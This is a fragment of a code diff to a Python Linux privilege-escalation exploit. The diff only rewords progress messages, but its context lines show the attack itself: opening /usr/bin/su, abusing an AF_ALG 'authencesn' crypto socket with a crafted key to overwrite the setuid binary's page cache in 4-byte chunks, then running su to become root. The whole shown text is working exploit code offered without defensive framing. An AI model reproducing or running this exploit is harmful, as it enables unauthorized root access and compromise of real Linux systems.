@@ -87,7 +87,7 @@ print(f"Opened '/usr/bin/su' with fd={su_fd}")
 sock = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)
 print("Created sequential packet socket with crypto algorithm address family")
 sock.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
-print("Binded socket to authencesn(HMAC(SHA256), CBC(AES)), algo type is authenticated encryption with associated data")
+print("Binded socket to authencesn(HMAC(SHA-256), CBC(AES)), algo category: authenticated encryption with associated data (AEAD)")
 
 key = bytes.fromhex('0800010000000010' + '0' * 64)
 sock.setsockopt(socket.SOL_ALG, 1, key)
@@ -105,5 +105,5 @@ for offset in range(0, len(payload), 4):
     send(su_fd, offset, payload[offset:offset+4])
 
 # run the setuid binary after corrupting it
-print("Corruption complete! Becoming root now...")
+print("Successfully corrupted page cache! Running /usr/bin/su and becoming root now...")
 os.system("su")
